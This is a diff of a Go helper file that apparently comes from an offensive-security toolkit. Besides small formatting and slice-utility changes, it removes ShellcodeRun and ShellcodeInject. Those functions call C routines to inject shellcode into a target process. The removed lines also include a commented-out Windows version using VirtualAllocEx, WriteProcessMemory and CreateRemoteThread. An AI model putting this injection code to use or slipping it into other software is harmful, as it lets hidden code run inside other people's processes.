@@ -48,11 +48,10 @@ void sc_inject(char *shellcode, size_t sclen, pid_t pid) {
     }
     REG_IP_VALUE(regs) += 2;
 }
-*/
-import "C"
+
+import "C"*/
 import (
 	"archive/zip"
-	"unsafe"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
@@ -64,7 +63,6 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
-	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -175,32 +173,36 @@ func _sleep(seconds int, endSignal chan<- bool) {
 	endSignal <- true
 }
 
-func f(str string, arg ...interface{}) string {
+func F(str string, arg ...interface{}) string {
 	return fmt.Sprintf(str, arg...)
+}
+
+func f(s string, arg ...interface{}) string {
+	return fmt.Sprintf(s, arg...)
 }
 
 func PrintGood(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] %s :: %s ", green(t), green(bold("[+]")), msg)
+	fmt.Printf("[%s] %s :: %s \n", green(t), green(bold("[+]")), msg)
 }
 
 func PrintInfo(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] [*] :: %s", t, msg)
+	fmt.Printf("[%s] [*] :: %s\n", t, msg)
 }
 
 func PrintError(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] %s :: %s ", red(t), red(bold("[x]")), msg)
+	fmt.Printf("[%s] %s :: %s \n", red(t), red(bold("[x]")), msg)
 }
 
 func PrintWarning(msg string) {
 	dt := time.Now()
 	t := dt.Format("15:04")
-	fmt.Printf("[%s] %s :: %s ", yellow(t), yellow(bold("[!]")), msg)
+	fmt.Printf("[%s] %s :: %s \n", yellow(t), yellow(bold("[!]")), msg)
 }
 
 func FileToSlice(file string) []string {
@@ -393,58 +395,6 @@ func RemoveFromSlice(slice []string, element string) []string {
 		}
 	}
 	return res
-}
-
-func ShellcodeRun(shellcode []byte) error {
-	switch runtime.GOOS {
-	case "windows":
-		return errors.New("syscall module works like shit - we will try to implement Windows shellcode runner differently")
-		/*kernel32 := syscall.NewLazyDLL("kernel32.dll")
-		  ntdll := syscall.NewLazyDLL("ntdll.dll")
-		  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-		  RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
-		  const MEM_COMMIT = 0x1000
-		  const MEM_RESERVE = 0x2000
-		  const PAGE_EXECUTE_READWRITE = 0x40
-		  addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-		  if err != nil {
-		      return err
-		  }
-		  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-		  syscall.Syscall(addr, 0, 0, 0, 0)*/
-	default:
-		C.sc_run((*C.char)(unsafe.Pointer(&shellcode[0])), (C.size_t)(len(shellcode)))
-	}
-	return nil
-}
-
-func ShellcodeInject(shellcode []byte, pid int) error {
-	switch runtime.GOOS {
-	case "windows":
-		return errors.New("syscall module works like shit - we will try to implement Windows shellcode injector differently")
-		/*kernel32 := syscall.NewLazyDLL("kernel32.dll")
-		  OpenProcess := kernel32.NewProc("OpenProcess")
-		  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-		  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-		  CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
-		  const PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
-		  const MEM_COMMIT = 0x1000
-		  const MEM_RESERVE = 0x2000
-		  const PAGE_EXECUTE_READWRITE = 0x40
-		  proc_handle, _, err := OpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
-		  if err != nil {
-		      return err
-		  }
-		  remote_buf, _, err := VirtualAllocEx.Call(proc_handle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-		  if err != nil {
-		      return err
-		  }
-		  WriteProcessMemory.Call(proc_handle, remote_buf, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
-		  CreateRemoteThread.Call(proc_handle, 0, 0, remote_buf, 0, 0, 0)*/
-	default:
-		C.sc_inject((*C.char)(unsafe.Pointer(&shellcode[0])), (C.size_t)(len(shellcode)), (C.pid_t)(pid))
-	}
-	return nil
 }
 
 func GetLocalIp() string {
@@ -1560,6 +1510,26 @@ func CurrentDirFiles() ([]string, error) {
 		files_in_dir = append(files_in_dir, f.Name())
 	}
 	return files_in_dir, nil
+}
+
+func RemoveStr(slice []string, s string) []string {
+	final := []string{}
+	for _, e := range slice {
+		if e != s {
+			final = append(final, e)
+		}
+	}
+	return final
+}
+
+func RemoveInt(slice []int, s int) []int {
+	final := []int{}
+	for _, e := range slice {
+		if e != s {
+			final = append(final, e)
+		}
+	}
+	return final
 }
 
 /*
